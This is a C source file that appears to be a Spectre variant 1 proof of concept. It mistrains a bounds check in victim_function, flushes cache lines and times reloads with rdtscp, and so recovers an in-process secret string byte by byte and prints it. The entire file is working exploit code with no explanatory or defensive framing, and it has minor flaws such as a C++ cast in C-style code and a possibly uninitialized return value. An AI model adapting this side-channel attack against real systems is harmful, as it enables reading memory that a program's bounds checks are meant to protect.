#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#define CACHE_HIT_THRESHOLD (100)

unsigned int spy_size = 16;
uint8_t cache_set[256 * 512];
uint8_t spy[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
const char* secret = "skajaldjsbsb";
uint8_t temp = 0;
int results[256];

void victim_function(size_t x) {
	if (x < spy_size) {
		temp &= cache_set[spy[x] * 512];
	}
}

uint8_t read_char(size_t malicious_x) {
	int tries, i, j, k, mix_i;
	unsigned int junk = 0;
	size_t training_x, x;
	uint64_t time1, time2;
	volatile uint8_t* addr;

	for (i = 0; i < 256; i++)
		results[i] = 0;
	for (tries = 999; tries > 0; tries--) {
		for (i = 0; i < 256; i++)
			_mm_clflush(&cache_set[i * 512]); 
		
		training_x = tries % spy_size;
		for (j = 29; j >= 0; j--) {
			_mm_clflush(&spy_size);
			for (volatile int z = 0; z < 100; z++) {} // Delay (can also mfence)

			// Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 
			// Avoid jumps in case those tip off the branch predictor 
			x = ((j % 6) - 1) & ~0xFFFF; // Set x=FFF.FF0000 if j%6==0, else x=0 
			x = (x | (x >> 16)); // Set x=-1 if j%6=0, else x=0 
			x = training_x ^ (x & (malicious_x ^ training_x));

			victim_function(x);
		}

		for (i = 0; i < 256; i++) {
			mix_i = ((i * 167) + 13) & 255;
			addr = &cache_set[mix_i * 512];
			time1 = __rdtscp(&junk);
			junk = *addr;
			time2 = __rdtscp(&junk) - time1;
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != spy[training_x])
				results[mix_i]++;
		}
	}
    int max_time = 0, rst;
    for (i = 0; i < 256; i++) {
        if (results[i] > max_time) {
            rst = i;
            max_time = results[i];
        }
    }
    return rst;
}

int main() {
	size_t malicious_x = (size_t)(secret - (char *)spy);
	int len = strlen(secret);
    
	for (size_t i = 0; i < sizeof(cache_set); i++)
		cache_set[i] = 1; // write to cache_set so in RAM not copy-on-write zero pages 

	while (--len >= 0) {
		uint8_t rst = read_char(malicious_x++);
        printf("%c", static_cast<char>(rst));
	}
    printf("\n");
	return 0;
}